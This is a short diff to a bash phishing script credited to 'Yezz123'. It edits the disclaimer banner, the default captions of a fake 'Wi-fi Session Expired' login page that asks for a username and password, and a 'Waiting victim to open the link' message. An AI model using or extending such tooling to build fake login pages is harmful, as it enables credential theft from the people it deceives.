@@ -147,12 +147,12 @@ printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: Yezz123 \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Phisher take care please !::\e[0m\n"
 printf "\n"
 }
 
 createpage() {
-default_cap1="Wi-fi Session Expired"
+default_cap1="Wi-fi Session Expired , Try again"
 default_cap2="Please login again."
 default_user_text="Username:"
 default_pass_text="Password:"
@@ -370,7 +370,7 @@ checkfound
 checkfound() {
 
 
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim to open the link ...\e[0m\n"
 while [ true ]; do
 
 
